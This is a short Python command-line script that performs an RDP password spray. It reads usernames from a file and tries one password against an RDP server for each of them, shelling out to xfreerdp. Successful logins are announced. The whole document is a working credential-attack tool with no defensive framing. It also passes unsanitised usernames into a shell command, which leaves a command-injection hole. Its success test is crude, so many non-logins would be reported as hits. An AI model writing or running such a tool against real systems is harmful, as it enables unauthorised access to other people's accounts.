import click
import subprocess
import time

@click.command()
@click.option('-s', '--server', prompt='RDP server IP or hostname', help='RDP server IP or hostname')
@click.option('-u', '--usernames', prompt='Path to username file', help='File containing usernames')
@click.option('-p', '--password', prompt=True, hide_input=True, confirmation_prompt=True, help='Password to spray')
def password_spray(server, usernames, password):
    click.echo("**********************************************")
    click.echo("*          Welcome to RDP Password Spray      *")
    click.echo("**********************************************")
    click.echo("")
    click.echo(f"RDP Server: {server}")
    click.echo(f"Username File: {usernames}")
    click.echo(f"Password: {password}")
    click.echo("")
    click.echo("**********************************************")
    click.echo("*                 SPRAYING                    *")
    click.echo("**********************************************")
    click.echo("")

    try:
        with open(usernames, 'r') as file:
            usernames_list = file.readlines()

        for username in usernames_list:
            username = username.strip()
            command = f"xfreerdp /u:{username} /p:{password} /v:{server}"

            click.echo(f"[*] Trying {username}:{password}...")
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            output, error = process.communicate()

            if 'Logon failure' in str(output) or 'Invalid credentials' in str(output):
                click.echo(f"[!] Failed: {username}:{password}")
            else:
                click.echo(f"[+] Success: {username}:{password}")
                break

            time.sleep(1)

    except FileNotFoundError:
        click.echo("[!] Error: Username file not found.")
    except Exception as e:
        click.echo(f"[!] An error occurred: {str(e)}")

def welcome_message():
    click.echo("**********************************************")
    click.echo("*          Welcome to RDP Password Spray      *")
    click.echo("**********************************************")
    click.echo("")

if __name__ == '__main__':
    welcome_message()
    click.echo("")
    click.echo("**********************************************")
    click.echo("           Enter information below           *")
    click.echo("**********************************************")
    click.echo("")
    password_spray()
